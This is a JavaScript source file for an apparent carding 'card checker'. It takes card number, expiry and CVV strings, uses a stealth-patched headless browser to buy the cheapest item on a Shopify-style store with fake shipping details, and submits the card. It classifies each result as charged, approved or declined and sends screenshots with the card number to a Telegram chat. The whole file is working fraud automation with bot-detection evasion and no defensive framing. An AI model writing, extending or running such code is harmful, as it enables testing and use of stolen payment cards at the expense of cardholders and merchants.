const axios = require("axios");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
puppeteer.use(StealthPlugin());

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function escapeHTML(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function parseCC(ccInput) {
  const parts = ccInput.split("|");
  if (parts.length < 4) return null;
  return {
    number: parts[0].trim(),
    month: parts[1].trim().padStart(2, "0"),
    year: parts[2].trim().length === 2 ? "20" + parts[2].trim() : parts[2].trim(),
    cvv: parts[3].trim()
  };
}

// ============ BIN LOOKUP ============
async function getBinInfo(bin) {
  try {
    const r = await axios.get("https://lookup.binlist.net/" + bin, {
      timeout: 5000,
      headers: { "Accept-Version": "3" }
    });
    if (r.data) {
      return {
        brand: (r.data.scheme || "VISA").toUpperCase(),
        issuer: (r.data.bank?.name || "BANK").toUpperCase(),
        country: (r.data.country?.name || "USA").toUpperCase(),
        flag: r.data.country?.emoji || ""
      };
    }
  } catch(e) {}
  return { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
}

// ============ CLASSIFY RESPONSE ============
function classifyResponse(responseText, approved) {
  const r = (responseText || "").toUpperCase();
  const chargedKw = ["CHARGED", "CAPTURED", "PAID", "PAYMENT_AUTHORIZED", "THANK YOU", "ORDER CONFIRMED", "ORDER #"];
  const approvedKw = [
    "APPROVED", "SUCCESS", "AUTHORIZED",
    "OTP_REQUIRED", "3DS_REQUIRED", "3D_SECURE",
    "AUTHENTICATION_REQUIRED", "PENDING", "REDIRECT",
    "INCORRECT_CVC", "INCORRECT_NUMBER", "SECURITY CODE"
  ];
  const declinedKw = [
    "DECLINED", "INSUFFICIENT", "DO NOT HONOR",
    "INVALID", "EXPIRED", "STOLEN", "BLOCKED",
    "RESTRICTED", "CARD_DECLINED", "LOST", "PICKUP",
    "TRANSACTION FAILED", "PAYMENT FAILED"
  ];

  for (const kw of chargedKw) if (r.includes(kw)) return "charged";
  for (const kw of declinedKw) if (r.includes(kw)) return "declined";
  for (const kw of approvedKw) if (r.includes(kw)) return "approved";
  if (approved) return "approved";
  return "declined";
}

// ============ SCREENSHOT ============
async function takeScreenshot(page) {
  try {
    return await page.screenshot({ encoding: "base64", type: "jpeg", quality: 70, fullPage: false });
  } catch(e) { return null; }
}

async function sendScreenshot(bot, chatId, base64img, caption) {
  try {
    if (!base64img || !bot || !chatId) return;
    const buf = Buffer.from(base64img, "base64");
    await bot.sendPhoto(chatId, buf, { caption: caption || "", parse_mode: "HTML" });
  } catch(e) {
    console.log("[SS ERROR]", e.message);
  }
}

// ============ CLOSE ALL POPUPS ============
async function closePopups(page) {
  // Common popup/overlay close selectors
  const popupSelectors = [
    // Close buttons
    'button[class*="close"]',
    'button[class*="dismiss"]',
    'button[aria-label*="close" i]',
    'button[aria-label*="dismiss" i]',
    '[class*="popup"] button[class*="close"]',
    '[class*="modal"] button[class*="close"]',
    '[class*="overlay"] button[class*="close"]',
    // X buttons
    '.klaviyo-close-form',
    '#closeIconContainer',
    '.needsclick.klaviyo_close_button',
    // Cookie
    'button[id*="cookie"] ',
    'button[class*="cookie"]',
    // Newsletter
    '[class*="newsletter"] button[class*="close"]',
    // Attentive
    '#attentive_close_button',
    // Common close text
    'button[class*="dismiss"]',
    '.popup__close',
    '.modal__close',
    '.js-modal-close',
    // Offer popups
    '[class*="offer"] button',
    '[class*="promo"] [class*="close"]'
  ];

  for (const sel of popupSelectors) {
    try {
      const el = await page.$(sel);
      if (el) {
        await el.click();
        await sleep(300);
        console.log("[POPUP CLOSED]", sel);
      }
    } catch(e) {}
  }

  // Press Escape key to close any modal
  try {
    await page.keyboard.press("Escape");
    await sleep(300);
  } catch(e) {}
}

// ============ GET PRODUCT ============
async function getProductREST(storeUrl) {
  try {
    const url = storeUrl.replace(/\/$/, "") + "/products.json?limit=250";
    const res = await axios.get(url, {
      timeout: 10000,
      headers: { "User-Agent": "Mozilla/5.0" }
    });
    const products = res.data?.products || [];
    if (!products.length) return null;

    // Try to find cheapest under $5
    let cheapest = null;
    for (const product of products) {
      for (const variant of (product.variants || [])) {
        const price = parseFloat(variant.price);
        if (price > 0 && price <= 5.00) {
          if (!cheapest || price < parseFloat(cheapest.price)) {
            cheapest = {
              id: variant.id,
              title: product.title,
              price: variant.price,
              variantId: variant.id,
              handle: product.handle
            };
          }
        }
      }
    }

    // Try under $20
    if (!cheapest) {
      for (const product of products) {
        for (const variant of (product.variants || [])) {
          const price = parseFloat(variant.price);
          if (price > 0 && price <= 20.00) {
            if (!cheapest || price < parseFloat(cheapest.price)) {
              cheapest = {
                id: variant.id,
                title: product.title,
                price: variant.price,
                variantId: variant.id,
                handle: product.handle
              };
            }
          }
        }
      }
    }

    // Fallback — first available product
    if (!cheapest) {
      const p = products[0];
      const v = p?.variants?.[0];
      if (v) cheapest = {
        id: v.id,
        title: p.title,
        price: v.price,
        variantId: v.id,
        handle: p.handle
      };
    }

    return cheapest;
  } catch(e) {
    console.log("[PRODUCT REST ERROR]", e.message);
    return null;
  }
}

// ============ SAFE TYPE IN FIELD ============
async function fillField(page, selectors, value, frameCtx = null) {
  const ctx = frameCtx || page;
  if (!Array.isArray(selectors)) selectors = [selectors];

  for (const sel of selectors) {
    try {
      const el = await ctx.$(sel);
      if (el) {
        await el.click({ clickCount: 3 });
        await sleep(100);
        await el.type(value, { delay: 60 });
        console.log("[FILLED]", sel, "=", value);
        return true;
      }
    } catch(e) {}
  }
  return false;
}

// ============ WAIT FOR SELECTOR SAFE ============
async function waitForSel(page, selector, timeout = 5000) {
  try {
    await page.waitForSelector(selector, { visible: true, timeout });
    return true;
  } catch(e) { return false; }
}

// ============ GET ALL FRAMES ============
function getAllFrames(page) {
  return page.frames();
}

// ============ FILL CARD IN SHOPIFY IFRAME ============
async function fillCardInFrames(page, card) {
  const frames = getAllFrames(page);
  console.log("[FRAMES]", frames.map(f => f.name() + " | " + f.url().substring(0, 80)));

  let filled = { number: false, expiry: false, cvv: false, name: false };

  for (const frame of frames) {
    const frameName = frame.name().toLowerCase();
    const frameUrl = frame.url().toLowerCase();

    // ---- Card Number Frame ----
    if (!filled.number && (
      frameName.includes("number") || frameUrl.includes("number") ||
      frameName.includes("card-fields-number")
    )) {
      try {
        await frame.waitForSelector("input", { timeout: 3000 });
        const inp = await frame.$("input");
        if (inp) {
          await inp.click({ clickCount: 3 });
          await inp.type(card.number, { delay: 80 });
          filled.number = true;
          console.log("[CARD NUMBER FILLED] in frame:", frameName);
        }
      } catch(e) { console.log("[NUM FRAME ERR]", e.message); }
    }

    // ---- Expiry Frame ----
    if (!filled.expiry && (
      frameName.includes("expiry") || frameUrl.includes("expiry") ||
      frameName.includes("card-fields-expiry")
    )) {
      try {
        await frame.waitForSelector("input", { timeout: 3000 });
        const inp = await frame.$("input");
        if (inp) {
          await inp.click({ clickCount: 3 });
          await inp.type(card.month + "/" + card.year.slice(-2), { delay: 80 });
          filled.expiry = true;
          console.log("[EXPIRY FILLED] in frame:", frameName);
        }
      } catch(e) { console.log("[EXP FRAME ERR]", e.message); }
    }

    // ---- CVV Frame ----
    if (!filled.cvv && (
      frameName.includes("verification") || frameUrl.includes("verification") ||
      frameName.includes("cvv") || frameName.includes("cvc") ||
      frameName.includes("card-fields-verification")
    )) {
      try {
        await frame.waitForSelector("input", { timeout: 3000 });
        const inp = await frame.$("input");
        if (inp) {
          await inp.click({ clickCount: 3 });
          await inp.type(card.cvv, { delay: 80 });
          filled.cvv = true;
          console.log("[CVV FILLED] in frame:", frameName);
        }
      } catch(e) { console.log("[CVV FRAME ERR]", e.message); }
    }

    // ---- Name Frame ----
    if (!filled.name && (
      frameName.includes("name") || frameUrl.includes("name") ||
      frameName.includes("card-fields-name")
    )) {
      try {
        await frame.waitForSelector("input", { timeout: 3000 });
        const inp = await frame.$("input");
        if (inp) {
          await inp.click({ clickCount: 3 });
          await inp.type("John Doe", { delay: 60 });
          filled.name = true;
          console.log("[NAME FILLED] in frame:", frameName);
        }
      } catch(e) { console.log("[NAME FRAME ERR]", e.message); }
    }
  }

  // ---- Fallback: Direct page fill (non-iframe sites) ----
  if (!filled.number) {
    console.log("[TRYING DIRECT CARD FILL]");
    await fillField(page, [
      'input[name="number"]',
      'input[autocomplete="cc-number"]',
      'input[data-card-field="number"]',
      'input[placeholder*="Card number" i]',
      'input[placeholder*="1234" i]',
      '#card_number'
    ], card.number);
  }

  if (!filled.expiry) {
    const exFilled = await fillField(page, [
      'input[name="expiry"]',
      'input[autocomplete="cc-exp"]',
      'input[placeholder*="MM / YY" i]',
      'input[placeholder*="expiry" i]'
    ], card.month + " / " + card.year.slice(-2));

    if (!exFilled) {
      await fillField(page, ['input[name="month"]', 'input[autocomplete="cc-exp-month"]'], card.month);
      await fillField(page, ['input[name="year"]', 'input[autocomplete="cc-exp-year"]'], card.year.slice(-2));
    }
  }

  if (!filled.cvv) {
    await fillField(page, [
      'input[name="verification_value"]',
      'input[autocomplete="cc-csc"]',
      'input[name="cvv"]',
      'input[placeholder*="CVV" i]',
      'input[placeholder*="CVC" i]',
      '#card_cvv'
    ], card.cvv);
  }

  return filled;
}

// ============ CLICK PAY BUTTON ============
async function clickPayButton(page) {
  // Try by text content first (most reliable)
  try {
    const clicked = await page.evaluate(() => {
      const buttons = Array.from(document.querySelectorAll('button, input[type="submit"]'));
      const payBtn = buttons.find(b => {
        const txt = (b.innerText || b.value || "").toLowerCase();
        return txt.includes("pay") || txt.includes("place order") ||
               txt.includes("complete") || txt.includes("submit") ||
               txt.includes("confirm");
      });
      if (payBtn) { payBtn.click(); return true; }
      return false;
    });
    if (clicked) { console.log("[PAY BTN] Clicked via text search"); return true; }
  } catch(e) {}

  // Selector fallback
  const paySelectors = [
    'button[type="submit"]',
    'button[data-trekkie-id="payment_method_submit_button"]',
    '#continue_button',
    '.step__footer__continue-btn',
    'input[type="submit"]',
    '[data-testid="submit-button"]'
  ];

  for (const sel of paySelectors) {
    try {
      const el = await page.$(sel);
      if (el) {
        await el.click();
        console.log("[PAY BTN] Clicked:", sel);
        return true;
      }
    } catch(e) {}
  }
  return false;
}

// ============ MAIN checkCard FUNCTION ============
async function checkCard(ccInput, storeUrl, onStep, bot, chatId) {
  const startTime = Date.now();
  let binInfo = { brand: "VISA", issuer: "BANK", country: "USA", flag: "" };
  let browser = null;

  const card = parseCC(ccInput);
  if (!card) {
    return {
      success: false,
      response: "INVALID_FORMAT",
      category: "declined",
      binInfo,
      timeTaken: "0.00",
      product: null
    };
  }

  const bin = card.number.substring(0, 6);
  const binPromise = getBinInfo(bin).then(b => { binInfo = b; }).catch(() => {});

  try {
    // ============ STEP 1 — Browser ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
      "🔄 <b>[1/6]</b> Launching browser...\n⬜⬜⬜⬜⬜⬜"
    );

    browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--disable-blink-features=AutomationControlled",
        "--no-first-run",
        "--no-zygote",
        "--single-process",
        "--window-size=1280,720"
      ]
    });

    const page = await browser.newPage();

    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    );
    await page.setViewport({ width: 1280, height: 720 });

    // Block unnecessary resources for speed
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const type = req.resourceType();
      if (["image", "stylesheet", "font", "media"].includes(type)) {
        req.abort();
      } else {
        req.continue();
      }
    });

    // ============ STEP 2 — Get Product ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "🔄 <b>[2/6]</b> Fetching products...\n🟩⬜⬜⬜⬜⬜"
    );

    const product = await getProductREST(storeUrl);
    if (!product) {
      await browser.close();
      await binPromise;
      return {
        success: false,
        response: "NO_PRODUCT_FOUND",
        category: "declined",
        binInfo,
        timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
        product: null
      };
    }

    console.log("[PRODUCT]", product.title, "$" + product.price);

    // ============ STEP 3 — Add to Cart ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "🔄 <b>[3/6]</b> Adding to cart...\n🟩🟩⬜⬜⬜⬜\n" +
      "🛒 <b>Item:</b> " + escapeHTML(product.title)
    );

    // First navigate to store (set cookies/session)
    await page.goto(storeUrl.replace(/\/$/, ""), {
      waitUntil: "domcontentloaded",
      timeout: 30000
    });
    await sleep(1000);

    // Close any popups on home page
    await closePopups(page);

    // Add to cart via API
    const cartResult = await page.evaluate(async (variantId) => {
      try {
        const res = await fetch("/cart/add.js", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ id: variantId, quantity: 1 })
        });
        const data = await res.json();
        return { ok: res.ok, data };
      } catch(e) {
        return { ok: false, error: e.message };
      }
    }, product.variantId);

    console.log("[CART ADD]", JSON.stringify(cartResult).substring(0, 200));

    if (!cartResult.ok) {
      // Try navigating to product page and clicking add to cart button
      const productUrl = storeUrl.replace(/\/$/, "") + "/products/" + product.handle;
      await page.goto(productUrl, { waitUntil: "domcontentloaded", timeout: 30000 });
      await sleep(1500);
      await closePopups(page);

      // Click add to cart button
      const atcSelectors = [
        'button[name="add"]',
        'button[id*="add-to-cart" i]',
        'button[class*="add-to-cart" i]',
        'input[name="add"]',
        'button[data-testid*="add-to-cart" i]',
        'button:contains("Add to Cart")',
        'form[action="/cart/add"] button[type="submit"]'
      ];

      for (const sel of atcSelectors) {
        try {
          const el = await page.$(sel);
          if (el) {
            await el.click();
            console.log("[ATC CLICKED]", sel);
            await sleep(1500);
            break;
          }
        } catch(e) {}
      }
    }

    await sleep(1000);

    // ============ STEP 4 — Checkout ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "✅ <b>[3/6]</b> Added to cart!\n" +
      "🔄 <b>[4/6]</b> Loading checkout...\n🟩🟩🟩⬜⬜⬜"
    );

    // Go to checkout
    await page.goto(storeUrl.replace(/\/$/, "") + "/checkout", {
      waitUntil: "networkidle2",
      timeout: 35000
    });
    await sleep(2500);

    // Close checkout popups
    await closePopups(page);

    const checkoutUrl = page.url();
    console.log("[CHECKOUT URL]", checkoutUrl);

    // Screenshot — checkout
    const ss2 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss2,
      "📋 <b>[4/6]</b> Checkout Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // ---- Fill Contact Info ----
    await fillField(page, [
      'input[type="email"]',
      'input[name="email"]',
      '#email',
      'input[autocomplete="email"]'
    ], "john" + Math.floor(Math.random() * 99999) + "@gmail.com");

    await sleep(500);

    // ---- Fill Shipping ----
    await fillField(page, [
      'input[name="firstName"]',
      'input[autocomplete="given-name"]',
      '#TextField1',
      'input[id*="firstName" i]'
    ], "John");

    await fillField(page, [
      'input[name="lastName"]',
      'input[autocomplete="family-name"]',
      '#TextField2',
      'input[id*="lastName" i]'
    ], "Doe");

    await fillField(page, [
      'input[name="address1"]',
      'input[autocomplete="shipping address-line1"]',
      '#TextField3',
      'input[id*="address1" i]'
    ], "123 Main Street");

    await fillField(page, [
      'input[name="city"]',
      'input[autocomplete="shipping address-level2"]',
      '#TextField5',
      'input[id*="city" i]'
    ], "New York");

    // State select
    try {
      const stateSelectors = [
        'select[name="zone"]',
        'select[name="province"]',
        'select[id*="ProvinceCode" i]',
        'select[autocomplete="shipping address-level1"]'
      ];
      for (const sel of stateSelectors) {
        const el = await page.$(sel);
        if (el) {
          await page.select(sel, "NY");
          console.log("[STATE SELECTED] NY");
          break;
        }
      }
    } catch(e) {}

    await fillField(page, [
      'input[name="zip"]',
      'input[name="postalCode"]',
      'input[autocomplete="shipping postal-code"]',
      'input[id*="postalCode" i]'
    ], "10001");

    await fillField(page, [
      'input[name="phone"]',
      'input[autocomplete="tel"]',
      'input[id*="phone" i]'
    ], "2125551234");

    await sleep(1000);

    // Screenshot after filling
    const ssAfterFill = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ssAfterFill,
      "📝 <b>[4/6]</b> Details Filled\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // ---- Click Continue to Shipping ----
    const continueSelectors = [
      'button[type="submit"]',
      'button[data-trekkie-id="continue_to_shipping_button"]',
      '.step__footer__continue-btn',
      '#continue_button',
      'button[id*="continue" i]'
    ];

    for (const sel of continueSelectors) {
      try {
        const el = await page.$(sel);
        if (el) {
          await el.click();
          console.log("[CONTINUE CLICKED]", sel);
          break;
        }
      } catch(e) {}
    }

    // Wait for navigation
    await Promise.race([
      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 }),
      sleep(8000)
    ]);
    await closePopups(page);
    await sleep(1000);

    // ---- Shipping Method ----
    console.log("[SHIPPING URL]", page.url());
    try {
      // Wait for shipping method to load
      await page.waitForSelector(
        'input[name="shipping_rate[id]"], .shipping-method__radio, [data-shipping-method]',
        { timeout: 8000 }
      );
      // Select first available shipping
      await page.evaluate(() => {
        const radios = document.querySelectorAll('input[type="radio"][name*="shipping"]');
        if (radios.length > 0) radios[0].click();
      });
      console.log("[SHIPPING SELECTED]");
      await sleep(1000);
    } catch(e) {
      console.log("[SHIPPING]", e.message);
    }

    // Continue to Payment
    for (const sel of continueSelectors) {
      try {
        const el = await page.$(sel);
        if (el) {
          await el.click();
          console.log("[CONTINUE TO PAYMENT]", sel);
          break;
        }
      } catch(e) {}
    }

    await Promise.race([
      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 }),
      sleep(8000)
    ]);
    await closePopups(page);
    await sleep(2000);

    // ============ STEP 5 — Payment ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "✅ <b>[3/6]</b> Added to cart!\n" +
      "✅ <b>[4/6]</b> Checkout loaded!\n" +
      "🔄 <b>[5/6]</b> Filling payment...\n🟩🟩🟩🟩⬜⬜"
    );

    const payUrl = page.url();
    console.log("[PAYMENT URL]", payUrl);

    // Screenshot payment page
    const ss3 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss3,
      "💳 <b>[5/6]</b> Payment Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // Wait for iframes to load
    await sleep(3000);

    // Fill card details
    await fillCardInFrames(page, card);
    await sleep(1500);

    // Screenshot after card fill
    const ss4 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss4,
      "📤 <b>[5/6]</b> Card Filled — Submitting...\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    // Click Pay button
    await clickPayButton(page);

    // Wait for result
    await Promise.race([
      page.waitForNavigation({ waitUntil: "networkidle2", timeout: 20000 }),
      sleep(12000)
    ]);
    await sleep(2000);

    // ============ STEP 6 — Result ============
    await onStep(
      "⏳ <b>Checking Card...</b>\n━━━━━━━━━━━━━━━\n" +
      "💳 <b>Card:</b> <code>" + escapeHTML(ccInput) + "</code>\n━━━━━━━━━━━━━━━\n" +
      "✅ <b>[1/6]</b> Browser ready!\n" +
      "✅ <b>[2/6]</b> Product: $" + product.price + "\n" +
      "✅ <b>[3/6]</b> Added to cart!\n" +
      "✅ <b>[4/6]</b> Checkout loaded!\n" +
      "✅ <b>[5/6]</b> Payment submitted!\n" +
      "🔄 <b>[6/6]</b> Getting result...\n🟩🟩🟩🟩🟩⬜"
    );

    const finalUrl = page.url();
    console.log("[FINAL URL]", finalUrl);

    // Screenshot result
    const ss5 = await takeScreenshot(page);
    await sendScreenshot(bot, chatId, ss5,
      "🎯 <b>[6/6]</b> Result Page\n💳 <code>" + escapeHTML(ccInput) + "</code>"
    );

    let paymentResponse = "DECLINED";
    let category = "declined";

    // Check URL
    if (finalUrl.includes("thank_you") || finalUrl.includes("orders") || finalUrl.includes("order-status")) {
      paymentResponse = "APPROVED - ORDER PLACED";
      category = "charged";
    } else {
      // Get page text
      const pageText = await page.evaluate(() => document.body.innerText || "").catch(() => "");
      const upperText = pageText.toUpperCase();
      console.log("[PAGE TEXT]", upperText.substring(0, 300));

      // Check error messages
      const errorSelectors = [
        '[class*="error" i]',
        '[class*="decline" i]',
        '.notice--error',
        '.field__message--error',
        '[data-error]',
        '.payment-errors',
        '[class*="alert" i]',
        '.Polaris-Banner--statusCritical'
      ];

      let errorMsg = "";
      for (const sel of errorSelectors) {
        try {
          const el = await page.$(sel);
          if (el) {
            const txt = await page.evaluate(e => e.innerText, el);
            if (txt && txt.trim().length > 2) {
              errorMsg = txt.trim();
              console.log("[ERROR MSG]", errorMsg);
              break;
            }
          }
        } catch(e) {}
      }

      if (errorMsg) {
        paymentResponse = errorMsg.toUpperCase();
      } else if (upperText.includes("THANK YOU") || upperText.includes("ORDER CONFIRMED")) {
        paymentResponse = "APPROVED";
        category = "charged";
      } else if (upperText.includes("3D SECURE") || upperText.includes("AUTHENTICATION REQUIRED")) {
        paymentResponse = "3DS_REQUIRED";
      } else if (upperText.includes("OTP")) {
        paymentResponse = "OTP_REQUIRED";
      } else if (upperText.includes("SECURITY CODE") || upperText.includes("INCORRECT CVC")) {
        paymentResponse = "INCORRECT_CVC";
      } else if (upperText.includes("DECLINED") || upperText.includes("FAILED")) {
        paymentResponse = "CARD_DECLINED";
      } else if (upperText.includes("INSUFFICIENT")) {
        paymentResponse = "INSUFFICIENT_FUNDS";
      } else {
        paymentResponse = "DECLINED";
      }

      if (category !== "charged") {
        category = classifyResponse(paymentResponse, false);
      }
    }

    await binPromise;

    return {
      success: true,
      response: paymentResponse,
      category,
      product,
      binInfo,
      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2)
    };

  } catch(err) {
    console.error("[MAIN ERROR]", err.message);

    if (browser) {
      try {
        const pages = await browser.pages();
        if (pages[0]) {
          const errSs = await takeScreenshot(pages[0]);
          await sendScreenshot(bot, chatId, errSs,
            "❌ <b>Error:</b> <code>" + escapeHTML(err.message) + "</code>"
          );
        }
      } catch(e) {}
    }

    await binPromise;
    return {
      success: false,
      response: "ERROR: " + err.message,
      category: "declined",
      binInfo,
      timeTaken: ((Date.now() - startTime) / 1000).toFixed(2),
      product: null
    };

  } finally {
    if (browser) {
      try { await browser.close(); } catch(e) {}
    }
  }
}

module.exports = { checkCard, classifyResponse };
